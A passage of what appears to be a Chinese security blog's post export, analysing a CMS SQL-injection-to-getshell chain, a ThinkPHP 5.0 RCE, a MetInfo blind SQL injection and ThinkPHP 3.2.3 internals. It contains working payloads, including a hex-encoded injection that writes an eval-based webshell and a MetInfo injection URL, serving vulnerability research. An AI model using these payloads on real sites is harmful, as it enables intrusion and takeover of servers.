1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- - 可以看到，我们成功进行了union查询，最终，我们查询的$res[&#39;position_style&#39;]结果为： 当满足$row[&#39;position_id&#39;] != $arr[&#39;id&#39;]的时候，$position_style = $row[&#39;position_style&#39;];被赋值为我们的payload，之后$position_style在拼接str:之后直接被带入fetch函数 跟入fetch函数 可以看到，我们的payload被未经处理的带入了fetch_str，看一下fetch_str进行了什么处理： 将$source里面包含的copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo替换为空，但是很显然忘记了assert（注意：在php7以上，assert不再能执行函数）） 之后包含了includes_cls_template_fetch_str.php文件，代码很短，但是是我们执行命令的重要的一步 123&lt;?php$template = $this;return preg_replace_callback(\"/&#123;([^\\&#125;\\&#123;\\n]*)&#125;/\", function($r) use(&amp;$template)&#123;return $template-&gt;select($r[1]);&#125;, $source); preg_replace_callback函数将{}之间的内容作为参数传给了select函数，进入select函数 在第三个条件分支满足条件，值的第一个字符为：\\$，将$tag的值拼接在&lt;?php xxxx ?&gt;之间，返回结果，返回的字符串为： 之后进入到_eval函数 可以看到我们的代码进入了eval执行，最后成功getshell，可以在根目录下发现1.php 总结 原本一个简单的XSS点，之后到有mysql版本限制的SQL注入，再到无任何限制的getshell，简直不要太强。。。。","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://yoursite.com/tags/漏洞分析/"},{"name":"安全技术","slug":"安全技术","permalink":"http://yoursite.com/tags/安全技术/"}]},{"title":"web安全思维导图","slug":"web安全思维导图","date":"2019-03-12T10:09:54.093Z","updated":"2019-03-12T10:11:27.731Z","comments":true,"path":"2019/03/12/web安全思维导图/","link":"","permalink":"http://yoursite.com/2019/03/12/web安全思维导图/","excerpt":"","text":"思维导图","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"ThinkPHP-5.0.* RCE分析","slug":"ThinkPHP-5.0.* RCE分析","date":"2019-01-23T02:18:40.118Z","updated":"2019-01-23T02:18:40.119Z","comments":true,"path":"2019/01/23/ThinkPHP-5.0.* RCE分析/","link":"","permalink":"http://yoursite.com/2019/01/23/ThinkPHP-5.0.* RCE分析/","excerpt":"","text":"前几周一直在复习考试，也没有看最近出的一些洞，寒假闲下来以后，要把最近出的洞都补了 漏洞核心TP的这个RCE漏洞，主要的触发点在Request类中的method方法，这个存在一个当前类的任意方法调用，之后通过这个任意方法调用去覆盖掉filter的默认方法，从而实现RCE 可以看到在526行，调用了$this-&gt;{$this-&gt;method}($_POST)，在这里，因为$this-&gt;method和$_POST我们都可控，可以调用当前类的任意方法， 漏洞分析程序流程 在App.php中，在116行的$dispatch = self::routeCheck($request,$config);进入URL路由检测 通过URL检测，TP获取到执行的控制器为captcha 在以下的调用栈中获取到了请求方法的type为method 之后回到Route.php调用了$method = strtolower($request-&gt;method();这里就是触发点 进入$request-&gt;method() 这里如果传入的POST数组设置了配置中的var_method的话，可以进入条件判断，我们看一下var_method是什么值 所以，如果我们传入的POST数组中有_method键值对的话就可以直接进入逻辑 进入逻辑后，很容易看出来，$this-&gt;method的值是我们的_method的值，我们可以利用这一点来执行当前类的任意方法 在当前类的__construct()方法中，传入的是一个数组，我们可以通过_method再一次调用这个类的__construct函数如果这个类没有可以用来进行一些恶意操作的函数的话，这个当前类的任意方法调用并没有什么用，但是巧的是，在__construct函数中有着变量覆盖，这样的话，我们就可以覆盖整个类中的所有成员变量，我们看看__construct函数 传入的参数是一个数组，正好我们之前的方法调用的参数正好是POST数组，而且在139行有一个很明显的变量赋值的操作，而且这个变量的键和值我们都可控，意味着我们可以进行当前类的变量覆盖，当然，显而易见的filter变量应该是最好的选择，因为filter会对所有传入的参数进行一次函数调用 最后，我们将filter的值覆盖为系统函数system 这里我们同时赋值$this-&gt;method的值为get，因为captcha路由规则需要是get方法才能不出错 在路由结束以后，调用了$data = self::exec($dispatch, $config); 因为在之前的路由中，判断路由的类型是method，所以进入了method的逻辑 这里又回到了Request类的方法调用，还记得我们之前对Reuqest类的变量覆盖吗，在这一步获取了filter的值，但是在之前，我们把filter覆盖为了system 在下面调用array_walk_recursive方法将$data的值都应用filterValue函数 最后，filterValue会对$data内的每个值都调用filter函数，这个时候，filter为system，data中为whoami 最后成功实现RCE 总结TP的此次RCE是因为对传入的_method没有进行过滤，所以TP在之后的修复中，也是对其中的_method设置了白名单 现在的web漏洞已经不再是以前的一个SQL注入，命令执行打天下的时代了，现在web的漏洞很多都需要很长的调用链才可以将整个攻击连贯起来","categories":[],"tags":[{"name":"漏洞分析,TP","slug":"漏洞分析-TP","permalink":"http://yoursite.com/tags/漏洞分析-TP/"}]},{"title":"MetInfo SQL注入漏洞详解","slug":"MetInfo SQL注入漏洞详解","date":"2018-10-17T03:17:26.454Z","updated":"2018-10-17T10:51:06.783Z","comments":true,"path":"2018/10/17/MetInfo SQL注入漏洞详解/","link":"","permalink":"http://yoursite.com/2018/10/17/MetInfo SQL注入漏洞详解/","excerpt":"","text":"MetInfo SQL注入漏洞详解前言之前CNVD爆出了一个最新版本的MetInfoSQL注入漏洞，根据payload正向分析了一遍漏洞原理，写一篇详细一点的 参数回溯payload: admin/index.php?m=web&amp;n=message&amp;c=message&amp;a=domessage&amp;action=add&amp;lang=cn&amp;para137=1&amp;para186=1&amp;para138=1&amp;para139=1&amp;para140=1&amp;id=42 and 1=1 需要在管理员页面触发，为一个bool类型的SQL盲注 问题出现在/app/message/web/message.class.php中的add函数 12345678910111213141516//message类public function add($info) &#123; global $_M; if(!$_M[form][id])&#123; $message=DB::get_one(\"select * from &#123;$_M[table][column]&#125; where module= 7 and lang ='&#123;$_M[form][lang]&#125;'\"); $_M[form][id]=$message[id]; &#125; $met_fd_ok=DB::get_one(\"select * from &#123;$_M[table][config]&#125; where lang ='&#123;$_M[form][lang]&#125;' and name= 'met_fd_ok' and columnid = &#123;$_M[form][id]&#125;\"); $_M[config][met_fd_ok]= $met_fd_ok[value]; if(!$_M[config][met_fd_ok])okinfo('javascript:history.back();',\"&#123;$_M[word][Feedback5]&#125;\"); if($_M[config][met_memberlogin_code])&#123; if(!load::sys_class('pin', 'new')-&gt;check_pin($_M['form']['code']))&#123; okinfo(-1, $_M['word']['membercode']); &#125; &#125; 可以看到在第七行处的$_M[form][id]并没有被单引号包裹，出现了SQL注入漏洞，我们再回溯变量看看$_M[form][id]是从哪里来的，可以看到第二行定义了全局变量$_M 123456//message类public function __construct() &#123; global $_M; parent::__construct(); $this-&gt;upfile = load::sys_class('upfile', 'new'); &#125; 并且在message的构造方法中也定义了$_M，且未初始化，判断$_M在message的构造方法中被赋值，在构造方法中还调用了父类的__construct方法 12345678910111213141516//web类public function __construct() &#123; parent::__construct(); global $_M; // 可视化窗口语言栏跳转后，整个可视化页面跳转到新语言 if(strpos($_SERVER['HTTP_REFERER'], 'pageset=1')!==false &amp;&amp; strpos($_SERVER['HTTP_REFERER'], 'lang=')!==false &amp;&amp; strpos($_SERVER['HTTP_REFERER'], $_M['url']['site'])!==false)&#123; preg_match('/lang=(\\w+)/', $_SERVER['HTTP_REFERER'], $prev_lang); if($prev_lang &amp;&amp; $prev_lang[1] !=$_M['lang'])&#123; $new_url=\"&#123;$_M['url']['site_admin']&#125;index.php?lang=&#123;$_M['lang']&#125;&amp;n=ui_set&amp;pageset=1\"; echo \"&lt;script&gt; parent.document.getElementsByClassName('page-iframe')[0].setAttribute('data-dynamic','&#123;$_M['url']['site']&#125;index.php?lang=&#123;$_M['lang']&#125;'); parent.window.location.href='&#123;$new_url&#125;'; &lt;/script&gt;\"; die; &#125; &#125; 在web类的构造方法中并没有发现对$_M的赋值操作，而且web类又调用了父类的构造方法，继续回溯web类父类的构造方法 123456789101112//common类public function __construct() &#123; global $_M;//全局数组$_M ob_start();//开启缓存 $this-&gt;load_mysql();//数据库连接 $this-&gt;load_form();//表单过滤 $this-&gt;load_lang();//加载语言配置 $this-&gt;load_config_global();//加载全站配置数据 $this-&gt;load_url_site(); $this-&gt;load_config_lang();//加载当前语言配置数据 $this-&gt;load_url();//加载url数据 &#125; 在这里的load_form函数中对传入的GPC参数进行了过滤和赋值，并且将处理过的GPC转存到$_M中 至此，我们找到了$_M赋值的地方，此时类的继承关系为：common-&gt;web-&gt;message 123456789101112131415161718192021222324252627protected function load_form() &#123; global $_M; $_M['form'] =array(); isset($_REQUEST['GLOBALS']) &amp;&amp; exit('Access Error'); foreach($_COOKIE as $_key =&gt; $_value) &#123; $_key&#123;0&#125; != '_' &amp;&amp; $_M['form'][$_key] = daddslashes($_value); &#125; foreach($_POST as $_key =&gt; $_value) &#123; $_key&#123;0&#125; != '_' &amp;&amp; $_M['form'][$_key] = daddslashes($_value); &#125; foreach($_GET as $_key =&gt; $_value) &#123; $_key&#123;0&#125; != '_' &amp;&amp; $_M['form'][$_key] = daddslashes($_value); &#125; if(is_numeric($_M['form']['lang']))&#123;//伪静态兼容 $_M['form']['page'] = $_M['form']['lang']; $_M['form']['lang'] = ''; &#125; if($_M['form']['metid'] == 'list')&#123; $_M['form']['list'] = 1; $_M['form']['metid'] = $_M['form']['page']; $_M['form']['page'] = 1; &#125; if(!preg_match('/^[0-9A-Za-z]+$/', $_M['form']['lang']) &amp;&amp; $_M['form']['lang'])&#123; echo \"No data in the database,please reinstall.\"; die(); &#125; &#125; 在load_form函数中我们发现了赋值给$_M的过程和过滤函数daddslashes，跟入查看 1234567891011121314151617181920212223/** * 对字符串进行反斜杠处理，如果服务器开启MAGIC_QUOTES_GPC。则不处理。 * @param string/array $string 处理的字符串或数组 * @param bool $force 是否强制反斜杠处理 * @return array 返回处理好的字符串或数组 */function daddslashes($string, $force = 0) &#123; !defined('MAGIC_QUOTES_GPC') &amp;&amp; define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc()); if(!MAGIC_QUOTES_GPC || $force) &#123; if(is_array($string)) &#123; foreach($string as $key =&gt; $val) &#123; $string[$key] = daddslashes($val, $force); &#125; &#125; else &#123; if(!defined('IN_ADMIN'))&#123; $string = trim(addslashes(sqlinsert($string))); &#125;else&#123; $string = trim(addslashes($string)); &#125; &#125; &#125; return $string;&#125; 在没有定义IN_ADMIN的时候在addslashes之前还调用了sqlinsert函数，这也就是为什么作者说在第一次尝试注入的时候发现SQL关键词都被清除了，所以我们需要找到一个地方定义了IN_ADMIN来绕过sqlinsert函数 正向分析即然我们需要IN_ADMIN值不为false，根据字面意思判断，就可以知道需要在管理页面找，而admin/index.php正好定义了IN_ADMIN的值 而且在此文件中我们可以更改GET参数来调用各种模型，类名，操作名(操作名必须以do开头) 作者找到了domessage函数可以触发add方法，并且将GET的参数全部传递过去，成功注入，鉴于里面的逻辑太复杂，直接使用xdebug跟踪函数调用 输入payload之后直接跟到调用add函数的位置，可以在PHPstorm中看到所有的函数调用关系 在_load_class中实例化了message类 在实例化的时候调用message类的构造方法，调用了message父类web的父类common的构造方法，并且使用了load_form过滤了传入的GPC参数，这个地方在跟踪的时候发现居然跳到了web类中实现的load_form函数，刚开始有点迷，后来想清楚了 在学面向对象的时候继承是一个很重要的概念，而这个时候就是面向对象的一个特性，此时调用方法是：$this-&gt;load_form();//表单过滤，可以看到当前的\\$this指向的是message类，这个时候去message类找load_form()函数，发现没有这个函数，根据继承的特性，程序向message类的父类去找load_form()函数，发现它的父类实现了load_form，所以直接调用message父类的load_form，而这个函数 12345678910111213141516171819202122/** * 重写common类的load_form方法，前台对提交的GET，POST，COOKIE进行安全的过滤处理 */ protected function load_form() &#123; global $_M; parent::load_form(); foreach ($_M['form'] as $key =&gt; $val) &#123; $_M['form'][$key] = sqlinsert($val); &#125; if ($_M['form']['id']!='' &amp;&amp; !is_numeric($_M['form']['id'])) &#123; $_M['form']['id'] = ''; &#125; if ($_M['form']['class1']!='' &amp;&amp; !is_numeric($_M['form']['class1'])) &#123; $_M['form']['class1'] = ''; &#125; if ($_M['form']['class2']!='' &amp;&amp; !is_numeric($_M['form']['class2'])) &#123; $_M['form']['class2'] = ''; &#125; if ($_M['form']['class3']!='' &amp;&amp; !is_numeric($_M['form']['class3'])) &#123; $_M['form']['class3'] = ''; &#125; &#125; 可以看到这里对每一个table传入的参数进行一次sqlinsert过滤，按理来说我们的payload已经被过滤了，通过监视$_M，确实我们的payload已经为空了 但是为什么我们的payload最后还能执行呢，再跟踪函数，我发现在调用完web类的load_form函数之后，调用了$this-&gt;upfile = load::sys_class(&#39;upfile&#39;, &#39;new&#39;);，在这个函数中又重新调用了common的构造方法，结果把payload又赋值给了$_M 这个时候我们的payload又回到了$_M的id参数中 这个时候，可以确定payload可以拼接入SQL语句中，但是接下来还需要将所有逻辑走通，接下来解答几个问题 为什么需要paraXXX参数在执行domessage函数的时候，可以看到在执行add函数之前执行了一个check_field函数，我们进入查看 123456789101112131415161718192021222324252627282930313233343536function check_field()&#123; global $_M; $messagecfg= load::mod_class('message/message_handle','new')-&gt;get_message_config(load::mod_class('message/message_database','new')-&gt;get_message_columnid()); $met_message_fd_class=$_M[form]['para'.$messagecfg[met_message_fd_class][value]]; $met_message_fd_content=$_M[form]['para'.$messagecfg[met_message_fd_content][value]]; $met_message_fd_email=$_M[form]['para'.$messagecfg[met_message_fd_email][value]]; $met_message_fd_sms=$_M[form]['para'.$messagecfg[met_message_fd_sms][value]]; $met_fd_back=$messagecfg[met_fd_back][value]; $paralist=load::mod_class('parameter/parameter_database','new')-&gt;get_parameter('7'); foreach ($paralist as $key =&gt; $val) &#123; $para[$val[id]]=$val; &#125; $paraarr = array(); foreach (array_keys($_M['form']) as $vale) &#123; if (strstr($vale, 'para')) &#123; if (strstr($vale, '_')) &#123; $arr = explode('_',$vale); $paraarr[] = str_replace('para','',$arr[0]); &#125;else&#123; $paraarr[] = str_replace('para','',$vale); &#125; &#125; &#125; foreach (array_keys($para) as $val) &#123; if($para[$val]['wr_ok']==1 &amp;&amp; !in_array($val,$paraarr))&#123; $info=\"【&#123;$para[$val]['name']&#125;】\".$_M[word][noempty]; okinfo('javascript:history.back();',$info); &#125; &#125; //met_message_fd_class 姓名 //met_message_fd_content 留言内容 //met_message_fd_email 邮箱 // met_message_fd_sms 电话 &#125; 下面这些变量就是我们传入参数中paraXXX的内容： 12345$met_message_fd_class=$_M[form]['para'.$messagecfg[met_message_fd_class][value]];$met_message_fd_content=$_M[form]['para'.$messagecfg[met_message_fd_content][value]];$met_message_fd_email=$_M[form]['para'.$messagecfg[met_message_fd_email][value]];$met_message_fd_sms=$_M[form]['para'.$messagecfg[met_message_fd_sms][value]];$met_fd_back=$messagecfg[met_fd_back][value]; 这一行if($para[$val][&#39;wr_ok&#39;]==1 &amp;&amp; !in_array($val,$paraarr))判断了我们传入的参数中有无paraXXX 我们需要在传入的参数中有137,186,138,139,140，否则会进入if条件中的逻辑 12$info=\"【&#123;$para[$val]['name']&#125;】\".$_M[word][noempty];okinfo('javascript:history.back();',$info); 为什么id必须为42123$met_fd_ok=DB::get_one(\"select * from &#123;$_M[table][config]&#125; where lang ='&#123;$_M[form][lang]&#125;' and name= 'met_fd_ok' and columnid = &#123;$_M[form][id]&#125;\");$_M[config][met_fd_ok]= $met_fd_ok[value];if(!$_M[config][met_fd_ok])okinfo('javascript:history.back();',\"&#123;$_M[word][Feedback5]&#125;\"); 可以看到，从数据库中取出$_met_fd_ok的值，如果$_met_fd_ok[value]不为空的话，继续往下执行，我们进入数据库看看这条语句到底取出来的是哪些值 可以看到我们想让它的返回不为空，id的值必须为42或者44，所以我们的注入的时候必须保证id的值为44或者42 总结metinfo的SQL注入漏洞是作者在几次给metinfo提交后met官方不予理睬才曝光的，希望厂商能多多重视安全吧","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://yoursite.com/tags/漏洞分析/"},{"name":"安全技术","slug":"安全技术","permalink":"http://yoursite.com/tags/安全技术/"}]},{"title":"TP框架源码分析","slug":"TP框架源码分析","date":"2018-10-14T15:49:10.450Z","updated":"2018-10-17T10:43:23.377Z","comments":true,"path":"2018/10/14/TP框架源码分析/","link":"","permalink":"http://yoursite.com/2018/10/14/TP框架源码分析/","excerpt":"","text":"TP框架源码分析TP框架执行流程图接下来几篇文章，通过xdebug的单步调试一步一步分析TP框架的源码，搞清楚他的框架实现，以及一些错误，异常，钩子等等的手法，看看我们的请求到底在TP内部产生了哪些变化 0x01 记录内存使用(4)12345// 记录开始运行时间$GLOBALS['_beginTime'] = microtime(TRUE);// 记录内存初始使用define('MEMORY_LIMIT_ON',function_exists('memory_get_usage'));if(MEMORY_LIMIT_ON) $GLOBALS['_startUseMems'] = memory_get_usage(); microtime — 返回当前 Unix 时间戳和微秒数 第2，3行判断了memory_get_usage方法是否存在，如果存在的话则调用memory_get_usage方法得到系统为php分配的内存，并且在全局变量中注册，下图为当前各变量的值和状态 0x02 各种常量定义(5) 定义了各种不同的url模式，在配置文件中可以更改 定义了类文件的后缀名为.class.php 定义了一些路径常量 THINK_PATH: /usr/local/var/www/test/ThinkPHP/ TP框架各种核心文件的根目录 LIB_PATH: /usr/local/var/www/test/ThinkPHP/Library/ 类库目录 APP_PATH: ./Application/ 应用目录 COMMON_PATH: ./Application/Common/ 应用公共目录 RUNTIME_PATH: ./Application/Runtime/ 应用运行目录 判断是否为SAE环境，如果不是为普通模式，存储类型默认为FILE 定义各种核心类库，运行时目录等等在运行时需要的路径常量，都是与之前的路径常量拼接得到的 0x03 对运行环境的判断123456789101112131415161718192021222324252627282930// 系统信息if(version_compare(PHP_VERSION,'5.4.0','&lt;')) &#123; ini_set('magic_quotes_runtime',0); define('MAGIC_QUOTES_GPC',get_magic_quotes_gpc()? true : false);&#125;else&#123; define('MAGIC_QUOTES_GPC',false);&#125;define('IS_CGI',(0 === strpos(PHP_SAPI,'cgi') || false !== strpos(PHP_SAPI,'fcgi')) ? 1 : 0 );define('IS_WIN',strstr(PHP_OS, 'WIN') ? 1 : 0 );define('IS_CLI',PHP_SAPI=='cli'? 1 : 0);if(!IS_CLI) &#123; // 当前文件名 if(!defined('_PHP_FILE_')) &#123; if(IS_CGI) &#123; //CGI/FASTCGI模式下 $_temp = explode('.php',$_SERVER['PHP_SELF']); define('_PHP_FILE_', rtrim(str_replace($_SERVER['HTTP_HOST'],'',$_temp[0].'.php'),'/')); &#125;else &#123; define('_PHP_FILE_', rtrim($_SERVER['SCRIPT_NAME'],'/')); &#125; &#125; if(!defined('__ROOT__')) &#123; $_root = rtrim(dirname(_PHP_FILE_),'/'); define('__ROOT__', (($_root=='/' || $_root=='\\\\')?'':$_root)); &#125;&#125;// 加载核心Think类require CORE_PATH.'Think'.EXT; 通过PHP版本和函数判断GPC是否开启，在5.4.0版本以下可以通过get_magic_quotes_gpc()来判断GPC是否开启，在5.4.0以后GPC被废除，所以直接定义MAGIC_QUOTES_GPC为false 判断PHP的SAPI是否为CGI，是否为WIN或者CLI 如果不是CLI模式，并且没有定义_PHP_FILE_的话，就定义_PHP_FILE_的值为当前脚本的路径(即为index.php入口文件的路径) 定义__ROOT__的值为tp框架所在的文件夹 最后包含核心框架类 以下为各种常量在本机的值(在不同的机器上有所不同)： 12345678910111213141516171819202122232425262728293031APP_DEBUG = trueAPP_PATH = \"./Application/\"MEMORY_LIMIT_ON = trueTHINK_VERSION = \"3.2.3\"URL_COMMON = 0URL_PATHINFO = 1URL_REWRITE = 2URL_COMPAT = 3EXT = \".class.php\"THINK_PATH = \"/usr/local/var/www/test/ThinkPHP/\"APP_STATUS = \"\"APP_MODE = \"common\"STORAGE_TYPE = \"File\"RUNTIME_PATH = \"./Application/Runtime/\"LIB_PATH = \"/usr/local/var/www/test/ThinkPHP/Library/\"CORE_PATH = \"/usr/local/var/www/test/ThinkPHP/Library/Think/\"BEHAVIOR_PATH = \"/usr/local/var/www/test/ThinkPHP/Library/Behavior/\"MODE_PATH = \"/usr/local/var/www/test/ThinkPHP/Mode/\"VENDOR_PATH = \"/usr/local/var/www/test/ThinkPHP/Library/Vendor/\"COMMON_PATH = \"./Application/Common/\"CONF_PATH = \"./Application/Common/Conf/\"LANG_PATH = \"./Application/Common/Lang/\"HTML_PATH = \"./Application/Html/\"LOG_PATH = \"./Application/Runtime/Logs/\"TEMP_PATH = \"./Application/Runtime/Temp/\"DATA_PATH = \"./Application/Runtime/Data/\"CACHE_PATH = \"./Application/Runtime/Cache/\"CONF_EXT = \".php\"CONF_PARSE = \"\"ADDON_PATH = \"./Application/Addon\"MAGIC_QUOTES_GPC = false 之后程序调用了Think.class.php的start()方法 0x04 实现错误与异常处理以及自动加载机制(7)123456// 注册AUTOLOAD方法spl_autoload_register('Think\\Think::autoload'); // 设定错误和异常处理register_shutdown_function('Think\\Think::fatalError');set_error_handler('Think\\Think::appError');set_exception_handler('Think\\Think::appException'); 这里有几个函数，分别来看看他们的用法： spl_autoload_register(): 注册给定的函数作为 __autoload 的实现，而__autoload会尝试加载未定义的类，实现了自动加载，以下是php.net给的官方说明 在注册自己的自动加载机制以后，TP实现了自己的致命错误处理，应用错误处理和应用异常处理机制，替换了php自己的错误处理机制 fatalError12345678910111213141516// 致命错误捕获static public function fatalError() &#123; Log::save(); if ($e = error_get_last()) &#123; switch($e['type'])&#123; case E_ERROR: case E_PARSE: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: ob_end_clean(); self::halt($e); break; &#125; &#125;&#125; 调用Log::save()将错误记录到日志中 通过error_get_last函数获得最后一次发生的错误 判断错误的类型 如果是E_USER_ERROR的话通过ob_end_clean输出缓冲区内容，并且将错误信息传入halt函数，此函数为TP定义的错误输出函数 appError123456789101112131415161718192021222324252627/** * 自定义错误处理 * @access public * @param int $errno 错误类型 * @param string $errstr 错误信息 * @param string $errfile 错误文件 * @param int $errline 错误行数 * @return void */ static public function appError($errno, $errstr, $errfile, $errline) &#123; switch ($errno) &#123; case E_ERROR: case E_PARSE: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: ob_end_clean(); $errorStr = \"$errstr \".$errfile.\" 第 $errline 行.\"; if(C('LOG_RECORD')) Log::write(\"[$errno] \".$errorStr,Log::ERR); self::halt($errorStr); break; default: $errorStr = \"[$errno] $errstr \".$errfile.\" 第 $errline 行.\"; self::trace($errorStr,'','NOTIC'); break; &#125; &#125; 和fatalErorr有些相像，先判断是那种类型的错误 如果是E_USER_ERROR的话，输出并清除缓冲区内容 如果设置了LOG_RECORD，则在日志文件中记录这次错误 调用halt函数将错误输出 如果不是错误而逝Notice的话，通过trace函数输出该Notice appException1234567891011121314151617181920212223/** * 自定义异常处理 * @access public * @param mixed $e 异常对象 */ static public function appException($e) &#123; $error = array(); $error['message'] = $e-&gt;getMessage(); $trace = $e-&gt;getTrace(); if('E'==$trace[0]['function']) &#123; $error['file'] = $trace[0]['file']; $error['line'] = $trace[0]['line']; &#125;else&#123; $error['file'] = $e-&gt;getFile(); $error['line'] = $e-&gt;getLine(); &#125; $error['trace'] = $e-&gt;getTraceAsString(); Log::record($error['message'],Log::ERR); // 发送404信息 header('HTTP/1.1 404 Not Found'); header('Status:404 Not Found'); self::halt($error); &#125; 当发生异常并且没有处理的时候，调用appException 获取错误信息，错误路径，获取发生错误的方法，文件，行数 在日志文件中记录当前的错误信息 向用户发送404状态码，并且输出错误信息 0x05 存储初始化(8)12// 初始化文件存储方式Storage::connect(STORAGE_TYPE); 在connect方法中，定义了一些文件的操作函数，如文件删除，追加，创建，读取等 0x06 缓存文件的定义与获取以及DEBUG模式的文件加载(9～22)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980$runtimefile = RUNTIME_PATH.APP_MODE.'~runtime.php';if(!APP_DEBUG &amp;&amp; Storage::has($runtimefile))&#123; Storage::load($runtimefile);&#125;else&#123; if(Storage::has($runtimefile)) Storage::unlink($runtimefile); $content = ''; // 读取应用模式 $mode = include is_file(CONF_PATH.'core.php')?CONF_PATH.'core.php':MODE_PATH.APP_MODE.'.php'; // 加载核心文件 foreach ($mode['core'] as $file)&#123; if(is_file($file)) &#123; include $file; if(!APP_DEBUG) $content .= compile($file); &#125; &#125; // 加载应用模式配置文件 foreach ($mode['config'] as $key=&gt;$file)&#123; is_numeric($key)?C(load_config($file)):C($key,load_config($file)); &#125; // 读取当前应用模式对应的配置文件 if('common' != APP_MODE &amp;&amp; is_file(CONF_PATH.'config_'.APP_MODE.CONF_EXT)) C(load_config(CONF_PATH.'config_'.APP_MODE.CONF_EXT)); // 加载模式别名定义 if(isset($mode['alias']))&#123; self::addMap(is_array($mode['alias'])?$mode['alias']:include $mode['alias']); &#125; // 加载应用别名定义文件 if(is_file(CONF_PATH.'alias.php')) self::addMap(include CONF_PATH.'alias.php'); // 加载模式行为定义 if(isset($mode['tags'])) &#123; Hook::import(is_array($mode['tags'])?$mode['tags']:include $mode['tags']); &#125; // 加载应用行为定义 if(is_file(CONF_PATH.'tags.php')) // 允许应用增加开发模式配置定义 Hook::import(include CONF_PATH.'tags.php'); // 加载框架底层语言包 L(include THINK_PATH.'Lang/'.strtolower(C('DEFAULT_LANG')).'.php'); if(!APP_DEBUG)&#123; $content .= \"\\nnamespace &#123;Think\\\\Think::addMap(\".var_export(self::$_map,true).\");\"; $content .= \"\\nL(\".var_export(L(),true).\");\\nC(\".var_export(C(),true).');Think\\Hook::import('.var_export(Hook::get(),true).');&#125;'; Storage::put($runtimefile,strip_whitespace('&lt;?php '.$content)); &#125;else&#123;// 调试模式加载系统默认的配置文件C(include THINK_PATH.'Conf/debug.php');// 读取应用调试配置文件if(is_file(CONF_PATH.'debug'.CONF_EXT)) C(include CONF_PATH.'debug'.CONF_EXT); &#125;&#125;// 读取当前应用状态对应的配置文件if(APP_STATUS &amp;&amp; is_file(CONF_PATH.APP_STATUS.CONF_EXT)) C(include CONF_PATH.APP_STATUS.CONF_EXT); // 设置系统时区date_default_timezone_set(C('DEFAULT_TIMEZONE'));// 检查应用目录结构 如果不存在则自动创建if(C('CHECK_APP_DIR')) &#123; $module = defined('BIND_MODULE') ? BIND_MODULE : C('DEFAULT_MODULE'); if(!is_dir(APP_PATH.$module) || !is_dir(LOG_PATH))&#123; // 检测应用目录结构 Build::checkDir($module); &#125;&#125;// 记录加载文件时间G('loadTime');// 运行应用App::run(); 定义$runtimefile的目录:./Application/Runtime/common~runtime.php 如果不是DEBUG模式并且存在缓存文件的话，直接加载缓存文件 如果是DEBUG模式，如果缓存文件存在的话则删除 读取当前应用模式，默认为普通模式，由APP_MODE定义，当前为普通模式 加载类型别名定义，实际上是将命名空间映射成对应文件的绝对路径 加载模式行为定义 加载底层语言包 加载调试模式的配置文件 判断应用状态并读取状态配置文件(如果APP_STATUS常量定义不为空的话) 调用App::run()运行应用 0x06 运行应用1234567891011121314151617static public function run() &#123; // 应用初始化标签 Hook::listen('app_init'); App::init(); // 应用开始标签 Hook::listen('app_begin'); // Session初始化 if(!IS_CLI)&#123; session(C('SESSION_OPTIONS')); &#125; // 记录应用初始化时间 G('initTime'); App::exec(); // 应用结束标签 Hook::listen('app_end'); return ; &#125; 应用初始化函数：App::init()123456789101112131415161718192021222324252627282930313233343536373839/** * 应用程序初始化 * @access public * @return void */static public function init() &#123;// 加载动态应用公共文件和配置load_ext_file(COMMON_PATH);// 日志目录转换为绝对路径 默认情况下存储到公共模块下面C('LOG_PATH', realpath(LOG_PATH).'/Common/');// 定义当前请求的系统常量define('NOW_TIME', $_SERVER['REQUEST_TIME']);define('REQUEST_METHOD',$_SERVER['REQUEST_METHOD']);define('IS_GET',REQUEST_METHOD =='GET' ? true : false);define('IS_POST', REQUEST_METHOD =='POST' ? true : false);define('IS_PUT',REQUEST_METHOD =='PUT' ? true : false);define('IS_DELETE', REQUEST_METHOD =='DELETE' ? true : false);// URL调度Dispatcher::dispatch();if(C('REQUEST_VARS_FILTER'))&#123; // 全局安全过滤 array_walk_recursive($_GET, 'think_filter'); array_walk_recursive($_POST, 'think_filter'); array_walk_recursive($_REQUEST, 'think_filter'); &#125;// URL调度结束标签Hook::listen('url_dispatch'); define('IS_AJAX', ((isset($_SERVER['HTTP_X_REQUESTED_WITH']) &amp;&amp; strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') || !empty($_POST[C('VAR_AJAX_SUBMIT')]) || !empty($_GET[C('VAR_AJAX_SUBMIT')])) ? true : false);// TMPL_EXCEPTION_FILE 改为绝对地址C('TMPL_EXCEPTION_FILE',realpath(C('TMPL_EXCEPTION_FILE')));return ;&#125; TP的应用初始化可以分为以下几个阶段： 加载动态应用的文件和配置(8) 设置日志文件的绝对路径(11) URL调度(13~34) 设置异常页面的模板文件(37) 应用开始函数：App::exec() 如果不是CLI环境的话，设置session 进入App::exec()函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556static public function exec() &#123; if(!preg_match('/^[A-Za-z](\\/|\\w)*$/',CONTROLLER_NAME))&#123; // 安全检测 $module = false; &#125;elseif(C('ACTION_BIND_CLASS'))&#123; // 操作绑定到类：模块\\Controller\\控制器\\操作 $layer = C('DEFAULT_C_LAYER'); if(is_dir(MODULE_PATH.$layer.'/'.CONTROLLER_NAME))&#123; $namespace = MODULE_NAME.'\\\\'.$layer.'\\\\'.CONTROLLER_NAME.'\\\\'; &#125;else&#123; // 空控制器 $namespace = MODULE_NAME.'\\\\'.$layer.'\\\\_empty\\\\'; &#125; $actionName = strtolower(ACTION_NAME); if(class_exists($namespace.$actionName))&#123; $class = $namespace.$actionName; &#125;elseif(class_exists($namespace.'_empty'))&#123; // 空操作 $class = $namespace.'_empty'; 